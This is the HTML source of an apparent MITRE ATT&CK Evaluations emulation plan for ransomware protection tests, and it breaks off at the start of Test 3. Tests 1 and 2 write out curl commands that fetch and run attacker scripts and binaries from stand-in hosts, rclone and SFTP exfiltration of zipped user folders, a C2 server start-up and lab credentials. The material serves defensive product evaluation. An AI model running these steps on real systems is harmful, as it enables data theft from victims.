@@ -1,0 +1,1580 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
+    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-root" content="/ael">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.786727257842">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.6.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Ransomware Protections Micros</title>
+    <meta name="title" content="Ransomware Protections Micros">
+    <meta name="description" content="From your Kali attack host corsair (223.246.0.70), open a new terminal tab and run the following commands to start the C2 server for protections:">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/protections/2024/emulation_plan/er6_ransomware_protections/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/protections/2024/emulation_plan/er6_ransomware_protections/">
+    <meta property="og:title" content="Ransomware Protections Micros">
+    <meta property="og:description" content="From your Kali attack host corsair (223.246.0.70), open a new terminal tab and run the following commands to start the C2 server for protections:">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/protections/2024/emulation_plan/er6_ransomware_protections/">
+    <meta property="twitter:title" content="Ransomware Protections Micros">
+    <meta property="twitter:description" content="From your Kali attack host corsair (223.246.0.70), open a new terminal tab and run the following commands to start the C2 server for protections:">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../../../favicon.png" rel="icon">
+    <link href="../../../../../resources/css/retype.css?v=3.6.0.786727257842" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../../resources/js/config.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../../resources/js/lunr.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../../resources/js/prism.js?v=3.6.0.786727257842" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../../../" class="flex items-center leading-snug text-xl">
+                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
+                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../images/attackevals-logo.png">
+                                <img class="max-h-10 hidden dark:inline-block" src="../../../../../images/attackevals-logo.png">
+                            </span>
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
+                        </a>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <nav class="breadcrumb" aria-label="Breadcrumb">
+                                    <ol role="list">
+                                        <li class="pr-4">
+                                            <a href="../../../../../" class="pr-4">
+                                                ATT&​CK Evaluations Library
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Enterprise
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <span class="pr-4">
+                                                Protections
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../enterprise/protections/2024/" class="pr-4">
+                                                Ransomware Protections Micros
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../enterprise/protections/2024/emulation_plan/" class="pr-4">
+                                                Ransomware Protections Micros
+                                            </a>
+                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
+                                            </svg>
+                                        </li>
+                                        <li class="pr-4">
+                                            <a href="../../../../../enterprise/protections/2024/emulation_plan/er6_ransomware_protections/" class="pr-4">
+                                                Ransomware Protections Micros
+                                            </a>
+                                        </li>
+                                    </ol>
+                                </nav>
+                
+                                <!-- Page content  -->
+<doc-anchor-target id="ransomware-protections-micros" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ransomware-protections-micros">#</doc-anchor-trigger>
+        <span>Ransomware Protections Micros</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="setup">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span>Setup</span>
+    </h2>
+</doc-anchor-target>
+<ul>
+<li>From your Kali attack host <code v-pre>corsair (223.246.0.70)</code>, open a new terminal tab and run the following commands to start the C2 server for protections:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd /opt/kalidev/evalsC2server
+sudo go build -o controlServer main.go
+sudo ./controlServer -c config/protections.yml</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Ensure that the C2 has started with the <code v-pre>[Simple File Server]</code> handler enabled.</li>
+</ul>
+<doc-anchor-target id="test-1-enumeration-and-exfiltration-via-batch-script-and-rclone">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-1-enumeration-and-exfiltration-via-batch-script-and-rclone">#</doc-anchor-trigger>
+        <span>Test 1: Enumeration and Exfiltration via Batch Script and rclone</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 1 emulates ransomware affiliates enumerating via batch script and
+exfiltration of files of interest via rclone. The setup on the victim
+host for this test includes pre-positioning of a batch script on victim
+<code v-pre>bts (10.222.25.61)</code> in C:\Windows\Temp\test1.bat and opening an elevated
+Command Prompt as sonicbeats37.fm\yoona.</p>
+<p>The test begins with execution of the batch script. The batch script will
+enumerate all user Desktop, Documents, and Downloads directories, create
+zips of files within the target directories, then exfiltrate the zips using
+rclone to the adversary server at <code v-pre>m1sfir3d.blog (36.43.97.151)</code>. The batch
+script will sleep for 30 seconds in between zip creations and rclone
+exfiltrations.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>From your Kali attack host <code v-pre>corsair (223.246.0.70)</code>, open a new terminal tab
+to setup the <code v-pre>rclone</code> server to receive the exfiltrated files:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">sudo rclone serve webdav /srv/http --addr 223.246.0.70:8080</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Ensure the Simple File Server handler is enabled and running</p>
+</li>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, RDP to
+<code v-pre>bts (10.222.25.61)</code> as <code v-pre>sonicbeats37.fm\yoona</code> if not already connected</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bts.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\yoona</td>
+<td>Exposed-Backpack</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>Search for Command Prompt and right-click to Run As Administrator</p>
+</li>
+<li><p>Download the batch script from the adversary server using curl</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl --output &quot;C:\Windows\Temp\test1.bat&quot; http://m1sfir3d.blog/files/test1.bat</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>Execute the batch script from your Administrative Command Prompt terminal.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\test1.bat http://36.43.97.65</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</p>
+</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p>In the elevated Command Prompt withing the RDP to <code v-pre>bts (10.222.25.61)</code>,
+download the cleanup script using curl.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl --output &quot;C:\Windows\Temp\cleanup_test1.bat&quot; http://m1sfir3d.blog/files/cleanup_test1.bat</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Execute the cleanup script.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">C:\Windows\Temp\cleanup_test1.bat</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cmd.exe executes test1.bat</td>
+<td>-</td>
+<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
+</tr>
+<tr>
+<td>test1.bat enumerates files in all user Desktop, Documents, and Downloads folders</td>
+<td><a href="../resources/protections/test1/test1.bat#L15">enumerate files</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test1.bat compresses files in a zip archive</td>
+<td><a href="../resources/protections/test1/test1.bat#L23">archive</a></td>
+<td>T1560.002 Archive Collected Data: Archive via Library</td>
+</tr>
+<tr>
+<td>test1.bat exfiltrates the archives using rclone</td>
+<td><a href="../resources/protections/test1/test1.bat#L55">exfiltrate</a></td>
+<td>T1048.003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-2-windows-exfiltration-archive-and-sftp">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-2-windows-exfiltration-archive-and-sftp">#</doc-anchor-trigger>
+        <span>Test 2: Windows Exfiltration: Archive and SFTP</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 2 emulates a ransomware threat actor attempting to zip files and
+exfiltrate them via SFTP on a windows target. The setup includes
+pre-positioning an executable file on a victim host
+<code v-pre>bts (10.222.25.61)</code> at the location <code v-pre>C:\Windows\Temp\test2.exe</code>. A
+command prompt window will be opened as user <code v-pre>yoona</code> and the executable
+will be run without arguments.</p>
+<p>The test begins with enumeration of all user directories inside of <code v-pre>C:\Users\</code>.
+Any <code v-pre>Desktop</code>, <code v-pre>Documents</code>, or <code v-pre>Downloads</code> directory will be zipped into
+individual zip archives. The executable will sleep for 15-30 seconds after each
+zip file creation.</p>
+<p>After all of the zips have been created, the executable will establish a
+connection to the attacker-controlled SFTP server. Once established, the
+executable will upload each zip archive to the SFTP server, sleeping for 15-30
+seconds after each upload has completed. Finally, the executable will output the
+list of uploaded files in the SFTP server.</p>
+<doc-anchor-target id="setup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F528;</span> Setup</span>
+    </h3>
+</doc-anchor-target>
+<doc-anchor-target id="sftp-check">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sftp-check">#</doc-anchor-trigger>
+        <span>SFTP Check</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p>From your Kali attack host <code v-pre>corsair (223.246.0.70)</code>, open a new terminal tab
+and execute the following command to ensure that the SFTP server is running:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sftp sftp_user@36.43.97.72</code></pre>
+</doc-codeblock></div>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sftp_user</td>
+<td>Password1!</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>After successful authentication, run the following commands:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">pwd
+ls</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<p>If the server responds without error, the SFTP server is running correctly.</p>
+<doc-anchor-target id="executable-transfer">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#executable-transfer">#</doc-anchor-trigger>
+        <span>Executable transfer</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From the Windows jumpbox <code v-pre>spitfire (223.246.0.90)</code>, RDP into the
+victim host <code v-pre>bts (10.222.25.61)</code> as <code v-pre>sonicbeats37.fm\yoona</code> if not already connected.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Hostname</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bts.sonicbeats37.fm</td>
+<td>sonicbeats37.fm\yoona</td>
+<td>Exposed-Backpack</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p>Open an elevated command prompt and execute the following command to download
+the test binary from the attacker server:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">curl.exe --output &quot;C:\Windows\Temp\test2.exe&quot; http://d3fend-ev1l.radio/files/test2.exe</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p>Change directories to the directory containing the <code v-pre>test2.exe</code> binary.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">cd C:\Windows\Temp</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="biohazard-procedures-1">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#biohazard-procedures-1">#</doc-anchor-trigger>
+        <span>:biohazard: Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Execute the test binary.</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">test2.exe</code></pre>
+</doc-codeblock></div>
+<p>After the executable has finished running, check that zip
+archives were uploaded to the SFTP server:</p>
+<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Switch to your Kali attacker machine and open a terminal tab.</p>
+<ul>
+<li>Run the following command to log into SFTP:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">sftp sftp_user@36.43.97.72</code></pre>
+</doc-codeblock></div>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sftp_user</td>
+<td>Password1!</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>After successful authentication, run the following commands:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">ls</code></pre>
+</doc-codeblock></div>
+<p>If there are zip files present, the test completed successfully.</p>
+<ul>
+<li><span class="docs-emoji">&#x1F4F7;</span> Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).</li>
+</ul>
+<doc-anchor-target id="cleanup">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F9F9;</span> Cleanup</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li>Run the following command to remove the created zip files from the victim
+host, and then check that there are no zip files left and the executable has
+been removed:</li>
+</ul>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">del *.zip
+del test2.exe
+dir</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="att-ck-techniques-and-reference-code">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#att-ck-techniques-and-reference-code">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F50D;</span> ATT&amp;CK Techniques and Reference Code</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x2139;&#xFE0F;</span> NOTE: Only the techniques under test are listed in this table</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Red Team Activity</th>
+<th>Source Code Link</th>
+<th>ATT&amp;CK Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cmd.exe executes test2.exe</td>
+<td>-</td>
+<td>T1059.003 Command and Scripting Interpreter: Windows Command Shell</td>
+</tr>
+<tr>
+<td>test2.exe enumerates files in all user Desktop, Documents, and Downloads folders</td>
+<td><a href="../resources/protections/test2/main.go#L86">get_target_dirs</a></td>
+<td>T1083 File and Directory Discovery</td>
+</tr>
+<tr>
+<td>test2.exe compresses files in zip archives</td>
+<td><a href="../resources/protections/test2/main.go#L126">create_zip</a></td>
+<td>T1560.002 Archive Collected Data: Archive via Library</td>
+</tr>
+<tr>
+<td>test2.exe exfiltrates zip archives over SFTP</td>
+<td><a href="../resources/protections/test2/main.go#L59">exfiltrate</a></td>
+<td>T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="test-3-enumeration-and-exfiltration-via-apis-and-http">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-3-enumeration-and-exfiltration-via-apis-and-http">#</doc-anchor-trigger>
+        <span>Test 3: Enumeration and Exfiltration via APIs and HTTP</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F3A4;</span> Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>Test 3 emulates a ransomware threat actor attempting to zip files in 1MB chunks and
+exfiltrate them via HTTP on a Linux target. The setup includes
